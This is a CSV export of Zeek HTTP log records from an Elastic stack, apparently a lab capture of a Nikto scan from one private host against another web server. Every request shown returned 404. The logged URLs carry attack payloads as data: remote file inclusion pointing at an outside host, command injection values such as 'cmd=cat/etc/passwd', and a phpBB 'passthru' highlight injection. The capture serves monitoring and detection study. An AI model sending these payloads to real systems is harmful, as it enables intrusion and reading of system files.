"@timestamp","_id","_ignored","_index","_score","agent.ephemeral_id","agent.id","agent.name","agent.name.text","agent.type","agent.version","data_stream.dataset","data_stream.namespace","data_stream.type","destination.address","destination.ip","destination.port","ecs.version","elastic_agent.id","elastic_agent.snapshot","elastic_agent.version","event.action","event.agent_id_status","event.category","event.created","event.dataset","event.id","event.ingested","event.kind","event.module","event.outcome","event.type","http.request.body.bytes","http.request.method","http.response.body.bytes","http.response.status_code","http.version","input.type","log.file.path","log.offset","network.community_id","network.transport","related.ip","source.address","source.ip","source.port",tags,"url.domain","url.extension","url.original","url.original.text","url.path","url.query","user_agent.device.name","user_agent.name","user_agent.original","user_agent.original.text","user_agent.os.full","user_agent.os.full.text","user_agent.os.name","user_agent.os.name.text","user_agent.os.version","user_agent.version","zeek.http.orig_fuids","zeek.http.orig_mime_types","zeek.http.resp_fuids","zeek.http.resp_mime_types","zeek.http.status_msg","zeek.http.trans_depth","zeek.session_id"
"Mar 7, 2025 @ 18:09:09.320",ozXecpUB2C2rFDMevaEj,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:09:10.342","zeek.http",CK0inA4VHzOnS3J5Gf,"Mar 7, 2025 @ 18:09:14.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","3,550,139","1:YGh1zZFr9/4EyZGJEkwxjVXM4oM=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","40,124","forwarded, zeek-http, _zeek_http_url_parse_failure","192.168.56.102","-","/topsites/index.php?page=http://blog.cirt.net/rfiinc.txt?&cmd=uNikto -a","/topsites/index.php?page=http://blog.cirt.net/rfiinc.txt?&cmd=uNikto -a","-","-",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",F1BJ5U3mRSj6ABxr3e,"text/html","File not found",1,CK0inA4VHzOnS3J5Gf
"Mar 7, 2025 @ 18:09:06.796",6zXecpUB2C2rFDMeqZxC,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:09:07.314","zeek.http",CyQEGKKVnLIsTz7W5,"Mar 7, 2025 @ 18:09:09.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","3,348,065","1:5WpF5ZBNivm/EBwDQq9Tax308sI=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","54,420","forwarded, zeek-http","192.168.56.102",php,"/pollvote.php?pollNikto=http://blog.cirt.net/rfiinc.txt?&cmd=ls","/pollvote.php?pollNikto=http://blog.cirt.net/rfiinc.txt?&cmd=ls","/pollvote.php","pollNikto=http://blog.cirt.net/rfiinc.txt?&cmd=ls",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FOdXdA1qoGO6UnFoF3,"text/html","File not found",1,CyQEGKKVnLIsTz7W5
"Mar 7, 2025 @ 18:09:04.631","8fPecpUBaT9JHWGjne_I","-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:09:05.287","zeek.http",CCRPB23GBHuys53Jal,"Mar 7, 2025 @ 18:09:06.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","3,162,142","1:PqKSDNqs7ubCvHpAp4lFDJsSEMU=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,612","forwarded, zeek-http","192.168.56.102",php,"/modules.php?Nikto=http://blog.cirt.net/rfiinc.txt&file=article&sid=2","/modules.php?Nikto=http://blog.cirt.net/rfiinc.txt&file=article&sid=2","/modules.php","Nikto=http://blog.cirt.net/rfiinc.txt&file=article&sid=2",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FZyu4E2TVWg2kaKc7,"text/html","File not found",1,CCRPB23GBHuys53Jal
"Mar 7, 2025 @ 18:09:03.123",7vPecpUBaT9JHWGjne3I,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:09:04.273","zeek.http",CEuNNL2LThb6kxVjc4,"Mar 7, 2025 @ 18:09:06.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","3,025,752","1:nhG+eIuR2wyoiSgtz7fBMU0pves=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","49,638","forwarded, zeek-http","192.168.56.102",php,"/index.php?pageNikto=http://blog.cirt.net/rfiinc.txt","/index.php?pageNikto=http://blog.cirt.net/rfiinc.txt","/index.php","pageNikto=http://blog.cirt.net/rfiinc.txt",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",F9QSNR22RZtJmJN1Nk,"text/html","File not found",1,CEuNNL2LThb6kxVjc4
"Mar 7, 2025 @ 18:09:02.886",qvPecpUBaT9JHWGjnezH,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:09:03.269","zeek.http",Cg0MoG44TVMX5pgGxh,"Mar 7, 2025 @ 18:09:06.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","3,006,603","1:PGfCgtkcBv2xKSIcbOH56iMuoeM=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","49,348","forwarded, zeek-http","192.168.56.102",php,"/index.php?home_Nikto=http://blog.cirt.net/rfiinc.txt","/index.php?home_Nikto=http://blog.cirt.net/rfiinc.txt","/index.php","home_Nikto=http://blog.cirt.net/rfiinc.txt",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FE6MwZ37leW0fQI1N2,"text/html","File not found",1,Cg0MoG44TVMX5pgGxh
"Mar 7, 2025 @ 18:09:02.832","n_PecpUBaT9JHWGjnezH","-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:09:03.269","zeek.http",CfoMCc2hojVmNttQlc,"Mar 7, 2025 @ 18:09:06.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","3,000,253","1:+UdT6UZ9f4enHVxNJ9CJFeu7Ais=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","49,232","forwarded, zeek-http","192.168.56.102",php,"/index.php?file_Nikto[]=http://blog.cirt.net/rfiinc.txt?","/index.php?file_Nikto[]=http://blog.cirt.net/rfiinc.txt?","/index.php","file_Nikto[]=http://blog.cirt.net/rfiinc.txt?",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",F738rX2VmLvezUYXSd,"text/html","File not found",1,CfoMCc2hojVmNttQlc
"Mar 7, 2025 @ 18:09:01.023",ivPecpUBaT9JHWGjjeoC,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:09:02.247","zeek.http",CWFTPV3RS9NuWWR9gd,"Mar 7, 2025 @ 18:09:02.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","2,833,444","1:/mZwCxDqkUPnvshlFTgGPU0wyO0=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","46,578","forwarded, zeek-http","192.168.56.102",php,"/gepi/gestion/savebackup.php?fileNikto=http://blog.cirt.net/rfiinc.txt&cmd=cat/etc/passwd","/gepi/gestion/savebackup.php?fileNikto=http://blog.cirt.net/rfiinc.txt&cmd=cat/etc/passwd","/gepi/gestion/savebackup.php","fileNikto=http://blog.cirt.net/rfiinc.txt&cmd=cat/etc/passwd",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",F9QcKI1MIPBWqJ7qo4,"text/html","File not found",1,CWFTPV3RS9NuWWR9gd
"Mar 7, 2025 @ 18:09:00.694",HPPecpUBaT9JHWGjjekC,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:09:01.242","zeek.http",C8Cy7V3WjbM7LFC5V,"Mar 7, 2025 @ 18:09:02.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","2,794,972","1:OEdChUPOOVEJB9yaDqCDZENcyHo=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","45,964","forwarded, zeek-http","192.168.56.102",php3,"/files/folder-reNikto.php3?BSX_LIBDIR=http://blog.cirt.net/rfiinc.txt","/files/folder-reNikto.php3?BSX_LIBDIR=http://blog.cirt.net/rfiinc.txt","/files/folder-reNikto.php3","BSX_LIBDIR=http://blog.cirt.net/rfiinc.txt",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FFMt861TugMWbDLbjj,"text/html","File not found",1,C8Cy7V3WjbM7LFC5V
"Mar 7, 2025 @ 18:08:57.888",kfPecpUBaT9JHWGjjeQB,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:58.214","zeek.http",CV0lXv2HAxFWPN4cub,"Mar 7, 2025 @ 18:09:02.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","2,562,091","1:bXt6OKmJcHs98S5XSSo9p4s5e5o=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","42,508","forwarded, zeek-http","192.168.56.102",php,"/cls_fast_template.php?fNikto=http://blog.cirt.net/rfiinc.txt","/cls_fast_template.php?fNikto=http://blog.cirt.net/rfiinc.txt","/cls_fast_template.php","fNikto=http://blog.cirt.net/rfiinc.txt",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FwAI8E3IcuAdMW7sw7,"text/html","File not found",1,CV0lXv2HAxFWPN4cub
"Mar 7, 2025 @ 18:08:57.278","X_PecpUBaT9JHWGjjeQB","-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:58.211","zeek.http",CdfXqq1KDV1lRNH7c6,"Mar 7, 2025 @ 18:09:02.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","2,532,128","1:rRtj7Mea2zqE51htqfE4T/DM6Rc=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","42,104","forwarded, zeek-http","192.168.56.102",php,"/class/jpcache/jpcache.php?_PSL[classdir]=http://blog.cirt.net/rfiinc.txt?exec=uNikto","/class/jpcache/jpcache.php?_PSL[classdir]=http://blog.cirt.net/rfiinc.txt?exec=uNikto","/class/jpcache/jpcache.php","_PSL[classdir]=http://blog.cirt.net/rfiinc.txt?exec=uNikto",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FKgr6RVQJwmIUm89j,"text/html","File not found",1,CdfXqq1KDV1lRNH7c6
"Mar 7, 2025 @ 18:08:53.465",OfPecpUBaT9JHWGjft5b,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:54.151","zeek.http",CJg3pZ2PlgZsRrPox9,"Mar 7, 2025 @ 18:08:58.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","2,216,618","1:asKrTwCGZPQIbJAzFrPNvgoY9B8=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,808","forwarded, zeek-http","192.168.56.102",php,"/ATutor/include/classes/module/module.class.php?row[dir_Nikto]=http://blog.cirt.net/rfiinc.txt","/ATutor/include/classes/module/module.class.php?row[dir_Nikto]=http://blog.cirt.net/rfiinc.txt","/ATutor/include/classes/module/module.class.php","row[dir_Nikto]=http://blog.cirt.net/rfiinc.txt",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FjHVLE3hNK5ljJJD1e,"text/html","File not found",1,CJg3pZ2PlgZsRrPox9
"Mar 7, 2025 @ 18:08:36.062",UfPecpUBaT9JHWGjN8br,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:36.985","zeek.http",C2R41q35NuSt9kKws6,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,070,897","1:vfopCgwePT1lx+xaZbHzOThLooA=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,514","forwarded, zeek-http, _zeek_http_url_parse_failure","192.168.56.102","-","/forum/index.php?Nikto=forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/forum/index.php?Nikto=forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","-","-",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FR5h5b3aLng6oKBYa3,"text/html","File not found",1,C2R41q35NuSt9kKws6
"Mar 7, 2025 @ 18:08:36.056",UPPecpUBaT9JHWGjN8br,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:36.985","zeek.http",CC41tx3sOHfs4PRA07,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,070,262","1:Rm2DjyPM+a1ihU1UyIEndtHGEFE=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,500","forwarded, zeek-http, _zeek_http_url_parse_failure","192.168.56.102","-","/phpBB/index.php?Nikto=forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/phpBB/index.php?Nikto=forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","-","-",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",Fyj2KtY4736u6Eyse,"text/html","File not found",1,CC41tx3sOHfs4PRA07
"Mar 7, 2025 @ 18:08:36.047","T_PecpUBaT9JHWGjN8br","-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:36.985","zeek.http",CkY5fn2ESwXn72Emw1,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,069,625","1:qmsoKQbGUm5URuK9/p25vr6pPmk=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,494","forwarded, zeek-http, _zeek_http_url_parse_failure","192.168.56.102","-","/modules/index.php?Nikto=forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/modules/index.php?Nikto=forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","-","-",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FZu392WkhoQJRBGLg,"text/html","File not found",1,CkY5fn2ESwXn72Emw1
"Mar 7, 2025 @ 18:08:36.041",TvPecpUBaT9JHWGjN8br,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:36.985","zeek.http",CECTat3UivPU771Bf1,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,068,981","1:FZGQ9ckFZxZASeWUvCaoDpZQ41A=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,484","forwarded, zeek-http, _zeek_http_url_parse_failure","192.168.56.102","-","/postnuke/html/index.php?Nikto=forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/postnuke/html/index.php?Nikto=forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","-","-",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FOGnGe1eKsGrjBBVbj,"text/html","File not found",1,CECTat3UivPU771Bf1
"Mar 7, 2025 @ 18:08:36.032",TfPecpUBaT9JHWGjN8br,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:36.985","zeek.http",CjZf5P2de0QOCDF3y2,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,068,342","1:qXMtUCnxQdpowpOGsrnOZxgbZtI=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,478","forwarded, zeek-http, _zeek_http_url_parse_failure","192.168.56.102","-","/postnuke/index.php?Nikto=forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/postnuke/index.php?Nikto=forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","-","-",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",Fm2Ulk4hcNrJoj0Cne,"text/html","File not found",1,CjZf5P2de0QOCDF3y2
"Mar 7, 2025 @ 18:08:36.027",TPPecpUBaT9JHWGjN8br,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:36.985","zeek.http",CNgUwp4NwSYoHsgB64,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,067,712","1:IiaMooaZeK2cNhgTUA28+nkL4VM=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,462","forwarded, zeek-http, _zeek_http_url_parse_failure","192.168.56.102","-","/index.php?Nikto=forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/index.php?Nikto=forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","-","-",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FImLwi1zKVIAIJSpml,"text/html","File not found",1,CNgUwp4NwSYoHsgB64
"Mar 7, 2025 @ 18:08:35.977","P_PecpUBaT9JHWGjN8br","-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:36.984","zeek.http",C3njywEn28XRCsy9e,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,063,261","1:iqDES/iw1d0uUf4WFHKj4YLbEDs=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,422","forwarded, zeek-http, _zeek_http_url_parse_failure","192.168.56.102","-","/forum/index.php?Nikto=Forums&file=viewtopic&t=2&rush=ls 